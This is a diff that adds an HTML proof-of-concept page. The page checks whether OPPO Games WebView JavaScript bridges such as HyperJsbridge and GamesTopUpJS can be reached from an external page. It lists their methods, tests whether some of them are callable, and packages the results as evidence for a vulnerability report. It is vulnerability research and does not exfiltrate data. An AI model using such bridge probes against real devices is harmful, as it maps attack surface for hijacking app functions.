@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPPO Games WebView PoC</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: #e94560;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        .indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .found {
+            background: #4ade80;
+        }
+
+        .not-found {
+            background: #f87171;
+        }
+
+        .info {
+            color: #94a3b8;
+            font-size: 0.9em;
+        }
+
+        pre {
+            background: #0f0f23;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-size: 0.85em;
+            margin-top: 10px;
+        }
+
+        .evidence {
+            background: #065f46;
+            border-left: 4px solid #10b981;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning {
+            background: #7c2d12;
+            border-left: 4px solid #f97316;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        button {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 1em;
+            cursor: pointer;
+            margin: 5px;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        #log {
+            background: #0f0f23;
+            padding: 15px;
+            border-radius: 8px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.8em;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🎮 OPPO Games WebView PoC</h1>
+
+        <div class="card">
+            <h3>Environment Detection</h3>
+            <div id="env-info"></div>
+        </div>
+
+        <div class="card">
+            <h3>JavaScript Bridge Detection</h3>
+            <div id="bridge-status"></div>
+        </div>
+
+        <div class="card">
+            <h3>Bridge Methods</h3>
+            <pre id="methods-list">Scanning...</pre>
+        </div>
+
+        <div class="card">
+            <h3>PoC Actions</h3>
+            <button onclick="testBridge()">Test Bridge Call</button>
+            <button onclick="copyEvidence()">Copy Evidence</button>
+        </div>
+
+        <div class="card">
+            <h3>Activity Log</h3>
+            <div id="log"></div>
+        </div>
+    </div>
+
+    <script>
+        const log = (msg) => {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            el.textContent += `[${time}] ${msg}\n`;
+            el.scrollTop = el.scrollHeight;
+        };
+
+        const checkBridges = () => {
+            const bridges = [
+                'HyperJsbridge',
+                'HeytapNativeApi',
+                'hybridAct',
+                'GamesTopUpJS',
+                'Android',
+                'webkit'
+            ];
+
+            const statusEl = document.getElementById('bridge-status');
+            const methodsEl = document.getElementById('methods-list');
+            let html = '';
+            let methodsHtml = '';
+            let foundAny = false;
+
+            bridges.forEach(name => {
+                const exists = typeof window[name] !== 'undefined';
+                html += `<div class="status">
+                    <div class="indicator ${exists ? 'found' : 'not-found'}"></div>
+                    <span>${name}: ${exists ? '✅ FOUND' : '❌ Not found'}</span>
+                </div>`;
+
+                if (exists) {
+                    foundAny = true;
+                    log(`Bridge found: ${name}`);
+                    try {
+                        const methods = [];
+                        for (let key in window[name]) {
+                            if (typeof window[name][key] === 'function') {
+                                methods.push(key);
+                            }
+                        }
+                        if (methods.length > 0) {
+                            methodsHtml += `${name}:\n  ${methods.join('\n  ')}\n\n`;
+                            log(`${name} methods: ${methods.join(', ')}`);
+                        }
+                    } catch (e) {
+                        methodsHtml += `${name}: Error enumerating - ${e.message}\n\n`;
+                    }
+                }
+            });
+
+            statusEl.innerHTML = html;
+            methodsEl.textContent = methodsHtml || 'No bridge methods found';
+
+            if (foundAny) {
+                statusEl.innerHTML += `<div class="evidence">
+                    <strong>⚠️ Vulnerability Confirmed!</strong><br>
+                    JavaScript bridges are accessible from this external page.
+                </div>`;
+            }
+        };
+
+        const getEnvInfo = () => {
+            const envEl = document.getElementById('env-info');
+            const ua = navigator.userAgent;
+            const isWebView = ua.includes('wv') || ua.includes('WebView');
+            const isOppo = ua.includes('OPPO') || ua.includes('CPH');
+
+            envEl.innerHTML = `
+                <div class="status">
+                    <div class="indicator ${isWebView ? 'found' : 'not-found'}"></div>
+                    <span>WebView: ${isWebView ? 'Yes' : 'Unknown'}</span>
+                </div>
+                <div class="status">
+                    <div class="indicator ${isOppo ? 'found' : 'not-found'}"></div>
+                    <span>OPPO Device: ${isOppo ? 'Detected' : 'Unknown'}</span>
+                </div>
+                <p class="info" style="margin-top:10px;font-size:0.75em;word-break:break-all;">
+                    UA: ${ua}
+                </p>
+            `;
+            log(`UserAgent: ${ua}`);
+        };
+
+        const testBridge = () => {
+            log('Testing bridge calls...');
+            if (typeof HyperJsbridge !== 'undefined') {
+                try {
+                    // Try to call a method
+                    log('Attempting HyperJsbridge call...');
+                    if (typeof HyperJsbridge.changeHyperAppid === 'function') {
+                        log('changeHyperAppid is callable');
+                    }
+                    if (typeof HyperJsbridge.playNow === 'function') {
+                        log('playNow is callable');
+                    }
+                } catch (e) {
+                    log(`Bridge call error: ${e.message}`);
+                }
+            } else {
+                log('HyperJsbridge not available');
+            }
+        };
+
+        const copyEvidence = () => {
+            const evidence = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                bridges: {},
+                log: document.getElementById('log').textContent
+            };
+
+            ['HyperJsbridge', 'HeytapNativeApi', 'hybridAct', 'GamesTopUpJS'].forEach(name => {
+                if (typeof window[name] !== 'undefined') {
+                    evidence.bridges[name] = 'FOUND';
+                    try {
+                        evidence.bridges[name + '_methods'] = Object.keys(window[name]).filter(
+                            k => typeof window[name][k] === 'function'
+                        );
+                    } catch (e) { }
+                }
+            });
+
+            const text = JSON.stringify(evidence, null, 2);
+
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(text).then(() => {
+                    log('Evidence copied to clipboard!');
+                    alert('Evidence copied to clipboard!');
+                }).catch(e => {
+                    log('Clipboard error: ' + e.message);
+                    prompt('Copy this evidence:', text);
+                });
+            } else {
+                prompt('Copy this evidence:', text);
+            }
+        };
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            log('PoC page loaded');
+            log(`Location: ${window.location.href}`);
+            getEnvInfo();
+            checkBridges();
+        });
+    </script>
+</body>
+
+</html>
